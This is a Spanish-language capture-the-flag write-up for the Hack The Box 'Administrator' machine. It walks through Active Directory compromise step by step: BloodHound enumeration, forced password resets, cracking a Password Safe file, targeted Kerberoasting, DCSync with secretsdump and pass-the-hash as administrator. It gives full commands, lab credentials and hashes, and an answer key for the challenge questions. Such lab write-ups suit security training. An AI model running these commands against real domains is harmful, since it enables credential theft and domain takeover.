---
title: Writeup administrator - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - administrator
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina administrator en Hack The Box.
keywords:
  - writeup administrator
  - hack the box administrator
  - resolución máquina administrator
  - administrator hack the box
  - htb administrator
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Medium/Windows/Administrator)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=ldpsP-toTVE)|[Parte2](https://www.youtube.com/watch?v=qq4N4-MbzqY)
- 🧠 **Explicación resumida**: 

---

#nmap #ping #windows #server #activedirectory #ad #/etc/hosts #bloodhound #bloodhound-python #neo4j #GenericAll #evil-winrm #forcechangepassword #ftp #pwsafe2john #nvim #john #pwsafe #netxec #genericwhite #targetedKerberoast #ntpdate #dcsync #getchanges #getchangesall #impacket-secretsdump #file #pwsafe2john #echo

-------
# Guided Mode

1)¿Cuál es el puerto TCP más bajo que escucha el administrador?
	21

2)¿Qué permisos tiene el usuario Olivia sobre el usuario Michael (según muestra BloodHound)?
	GenericAll

3)¿Qué permisos tiene el usuario Michael sobre el usuario Benjamin?
	ForceChangePassword

4)¿Cómo se llama el grupo no predeterminado al que pertenece Benjamin?
	Share Moderators

5)¿Cuál es la contraseña maestra para Backup.psafe3?
	tekieromucho

6)¿Cuál es la contraseña de la usuaria Emily en Administrador?
	UXLCI5iETUsIBoFVTj8yQFKoHjXmb

*La pregunta anterior es la flag de user.txt*
8)¿Qué permisos tiene el usuario Emily sobre el usuario Ethan?
	GenericWrite

9)¿Cuál es la contraseña del usuario Ethan en Administrador?
	limpbizkit

10)¿Qué permisos tiene el usuario Ethan sobre el dominio (según Bloodhound) que le permitirían tomar el control total del dominio?
	DCSync

11)¿Cuál es el hash NTLM del usuario administrador?
	3dc553ce4b9fd20bd016e098d2d2fd2e

--------

# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.113.25
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.113.25 -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,54690,59934,59939,59958,59961,59993 -oN targetTCP
nmap -sU -n -Pn --top-ports 200 10.129.113.25 -oG allPortsUDP
extractPorts allPortsUDP
nmap -sU -sCV -p53,88,123,137,138,389,464,500,4500,5000,5353,5355,49205 10.129.113.25 -oN targetUDP
```
![[Administrator1.png]]
![[Administrator2.png]]
![[Administrator3.png]]
![[Administrator4.png]]
![[Administrator5.png]]
![[Administrator9.png]]
![[Administrator10.png]]
![[Administrator12.png]]

*TTL:* Maquina windows
*Puerto TCP:*
	`21` [[ftp]]
	`445` [[smb]]
	`5985` [[evil-winrm]]
*Puertos UDP:*
	Mucho ruido, nada relevante

*Datos importantes:*
	Dominio administrator.htb
	ftp esta corriendo con un windows NT
	

-------
# Agregamos dominio al /etc/hosts

Con [[nvim]] usamos el comando `nvim /etc/hosts`siendo root

![[Administrator7.png]]

```
10.129.113.25 administrator.htb
```

![[Administrator8.png]]

-----
# Escalada al usuario Michael

La maquina nos da estas credenciales de base al arrancar la maquina
	Olivia:ichliebedich
	![[Administrator11.png]]

### Recolectamos informacion con [[bloodhound]]

Vamos a ejecutar [[bloodhound-python]] para recolectar toda la informacion del dominio con el comando `bloodhound-python -u 'Olivia' -p 'ichliebedich' -ns 10.129.113.25 -d administrator.htb -c all`

![[Administrator15.png]]
Ya tenemos toda al informacion en archivos que se crearon en nuestro directorio actual de trabajo

### Iniciamos base de datos [[neo4j]]

Siendo root usamos `neo4j console`
![[Administrator16.png]]
Nos dice que va a estar corriendo en localhost:7687



### Abrimos [[bloodhound]]

Para abrirlo usamos el comando `bloodhound & disown`


![[Administrator19.png]]

Despues vamos aponer en upload data y seleccionamos todos los archivos que se crearon con [[bloodhound-python]] previamente

![[Administrator20.png]]
Ya tenemos todos los datos cargados


Ahora vamos a buscar el usuario de olivia, ya que solamente tenemos las credenciales de este usuario
![[Administrator21.png]]

![[Administrator22.png]]
Al usuario de olivia le hago click derecho y apreto en *Mark User as Owned*. Nos va a poner una calaverita para distingir que somos nosotros


![[Administrator24.png]]
Apreto en *First Degree Object Control*

Si le hago click derecho a la linea y pongo help
![[Administrator25.png]]
Con el permiso [[GenericAll]] podemos cambiar la contraseña del usuario *Michael* y nos da el comando
![[Administrator26.png]]
Usamos `net rpc password "michael" "pawned" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "10.129.112.214"` y nos da que la contraseña no se puede cambiar por que no cumple los requerimientos, asi que probamos `net rpc password "michael" "pawned123" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "10.129.112.214"`. En teoria se cambio con exito

![[Administrator27.png]]
Las credenciales son michael:pawned123
Pero para probar si las credenciales son validas use [[evil-winrm]] con `evil-winrm -u michael -p pawned123 -i10.129.112.214` y como nos conecto ya sabemos que todo es correcto
![[Administrator28.png]]
Ya podemos poner en [[bloodhound]] que tenemos al usuario *Michael*

----
# Escalada usuario Benjamin

Vamos nuevamente a *First Degree Object Control* y nos da que podemos cambiar la contraseña del usuario *Benjamin* con el mismo metodo que usamos antes con el permiso [[ForceChangePassword]]

![[Administrator31.png]]

```shell
net rpc password "benjamin" "pawned1234" -U "administrator.htb"/"Michael"%"pawned123" -S "10.129.112.167"
```
Si ponia michael con minuscula no me agarraba
![[Administrator30.png]]
Las credenciales son benjamin:pawned1234

Y asi cambiamos la contraseña del usuario *benjamin*

-----
# Escalada al usuario emily

Con las credenciales de *Benjamin* nos vamos a conectar a [[ftp]] con el comando `ftp benjamin@10.129.112.167 -p 21` y proporcionamos la contraseña que le pusimos antes al usuario

![[Administrator33.png]]
Listamos con [[ls]] y vemos el archivo Backup.psafe3 que lo vamos a descargar con `get Backup.psafe3`

Con [[file]] usamos `file Backup.psafe3` y vemos que es un archivo *PasswordSafe V3 database*

![[Administrator34.png]]

Para empezar vamos a usar [[pwsafe2john]] para sacare el hash del archivo con el comando `pwsafe2john Backup.psafe3` y nos da este hash que lo vamos a poner en un archivo llamado *hash.txt* que lo vamos a crear con `nvim hash.txt` y ponerle todo el hash
Aclaracion: No hacerlo con [[echo]] por que al tener el simbolo $ rompe todo input


![[Administrator36.png]]

Ahora con [[john]] vamos a crackear el hash usando `john hash.txt -w=/usr/share/wordlists/rockyou.txt`

![[Administrator37.png]]
Nos da la contraseña tekieromucho

Ahora abrimos [[pwsafe]] con el comando `pwsafe Backup.psafe3`

![[Administrator38.png]]

![[Administrator39.png]]
Hacemos click en copy password y copy username
Nos va a dar las siguientes credenciales

```
Alexander Smith    alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily Rodriguez    emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma Johnson       emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```
Probamos todas con `netexec smb 10.129.112.167 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --shares`
La correcta es la de emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb

![[Administrator40.png]]
Asi que ahora con `evil-winrm -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -i 10.129.112.167` nos vamos a conectar y ya podemos catear la flag de user.txt

![[Administrator42.png]]
![[Administrator41.png]]

----------
# Escalada al usuario Ethan
Marcamos qeu tenemos al usuario *emily* vamos a *First Degree Object Control*  y vemos que podemos escalar a *ethan* usando el permiso [[GenericWhite]]
![[Administrator43.png]]

![[Administrator53.png]]
Nos muestra que podemos escalar con [[targetedKerberoast.py]]
Vamos a descargar el repositorio con [[git clone]] usando `git clone https://github.com/ShutdownRepo/targetedKerberoast` despues entramos con [[cd]] usando `cd targetedKerberoast`. Instalamos los requierements con `pip3 install -r requirements.txt` 

![[Administrator44.png]]

Intente ejecutar  el script pero tuve este error, ya que (Clock skew too great) es por que para kerberos tengo que tener la misma hora que la maquina

![[Administrator46.png]]

Usamos [[ntpdate]] para cambiar la hora con el comando `ntpdate 10.129.112.167`

![[Administrator45.png]]

Ahora si ejecutamos el script con `python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'`

![[Administrator48.png]]

Nos da todo este hash

```shell
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$23eb1fa79ea86f23efa08c4660349a97$a4b92ea1db424dad585c34d1f7bdc2065d1a9981e350e87b498afbe3dd7699e805b50bb39acb55dc81a13d96e5a70f70019b1a90958bb1cc5f43e82aae7d4c753d26be8bec4b479a4dda3d9809d7a627ff6c69310ee5c80069d34c65fcb54ec017a4ff50c14b894f48efa63b3af2193b2c1e859916d300f9debb232147051a63b2fa472f304044dece335996678806c803d1ac4e36e974074bbac499b6a7b6ba2887d97339aa1fa9843b26483b5472f71ed513c4ba13ff09785f2f2b29e058d4111ed4ff48e281771609e60929c4a2b5f4762178d71a770eb68d293a8d0a036bda9883977e9190f254b51bb7163f1f805bc4ac99b6f4c5e77ca119c4877b26cbe767d2020ae5e361550b5288ab159666ae281da0b7cd825390298f2d51361a79fb37cb876d37c4c14b6f8ab83cfb04a31e95200fcd722281e2a7b69417ea8a4a8dbba037812a3decfceffce970fd58dc499a7cabfaf13c168e24e662ffb6bb253e22cf22f665cbe6d83ad8c9f3054c77447bbf2d8e4fb3284dd6c1029922853948c0c49c9f97fdda9c52153873fed8c9981ca2423a722f8c6b352b3c5a4f46eb4723ddcf082543d354b100d701223a6144279f34bee85a66e9edae4b5105dcbedd33e01c6a7d248b3a5f5b4c1ae101c5002a088209c1b7fbe1d4b5380b073fa322610c60e5578b5a7a676a39e917c3c58a4e5efd2e76e28a3e04e97c8d974d072ae56817ea3281af08c57cb1a9910e7aa824deaf4a2df36bfcb0826fd825a8ba79ff51829c75a8ff4f07869155abb11be4cb86838a4ec07514f15b6ef1350d1c5cba88bd545ce339ef0747f886d090175e49564e77ee5d30c10d37a72c1dc65acae478ddd7e2faf84f6b652abbfd9759396ac0dc8507ee527d4952d3cfdde1d3ed39758d1b269f63fa9b37d9407ef854b4a1d6746c9c0dc0e55db1ce5c38993106a018aa94c26a505fc2bf21a0e90a98572e0e0ce9f8fc17c12a108bcb3f014e8318eeeb113e8d623122407b2e0d37b158e42be3c50680660b4533a43ae86be13cce1093cacdfaa73d39b3bc50f6b0fa39859e6b911a801d2800ff5ee152b7422b6cb5fec85dd4e7e518d45f2769447c8000d424f64cf887ab42748aa607eceb48bafd1dbd65fc0d50ca28fff1d70c281d3e8ced3f9c400a93fa3138c3455ee573b6b86941d92e1081f7dc50556ca2d5b92be543db39d3c78e35f37a58b9f4ecd265435070b9b3aa66318e89b505c5182a9e560d08091a6f7b1cbf3f1839c2c99b6bc2fc57a2152d19576d9a31155a05634daed291c187001ed2c816e9d444e35a8e993c75bac681d4a265d2f89f676865916d51c5695853b035c0cdf832b11ddabc3d02249abfbb9e219cd81cf52747aec02644f04ab74f83ff3e9c13985efb2fdfd46981456a90e1f0f92e38517310a6ff91ac6a8f2183bb73c087250e971aef0be940f1463caad4c6970f33c03fa4d956e914f95ede8d4b16febb7b3951a93cc2b4e66712d997105999b1aa50f6c0e65c546a3ec850367700ae6d19650f
```

Que lo voy a poner en un archivo llamado *ethan.txt* usando [[nvim]] con el comando `nvim ethan.txt` y pegando todo su contenido en el editor de texto

![[Administrator49.png]]
Ahora con [[john]] vamos crackear la contraseña usando el comando `john ethan.txt -w=/usr/share/wordlists/rockyou.txt`
Nos da la contraseña limpbizkit
Asi que tenemos las credenciales ethan:limpbizkit

Con `netexec smb 10.129.112.167 -u ethan -p 'limpbizkit' --shares` confirmamos que la contraseña es correcta

------
# Escalada al usuario Administrator

Marcamos que somos owner del usuario *Ethan* y en *First Degree Object Control* nos aparece que podemos pasar al usuario *administrator* abusando de los privilegios. [[DcSync]] [[GetChanges]] o [[GetchangesAll]] . El ultimo permiso que falta en help decia que estaba bug
![[Administrator50.png]]

![[Administrator51.png]]
Nos dice que podemos usar [[impacket-secretsdump]] con el comando `secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'`

![[Imagenes/Administrator52.png]]
Nos da los hashes de todos los usuarios, a nosotros nos interesa solo el del usuario *Administrator* y solamente vamos a tomar todo lo que viene despues de los ultimos *:*
```
3dc553ce4b9fd20bd016e098d2d2fd2e
```

Ahora nos conectamos con [[evil-winrm]] usamos `evil-winrm -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e' -i 10.129.112.167`

![[Administrator52 1.png]]
Ya podemos catear la ultima flag

--------
# Notas

Nunca tomar el 0 en cuenta cuando aparece en los dominios al final CTM en nmap


strace es para ver los logs de debugging


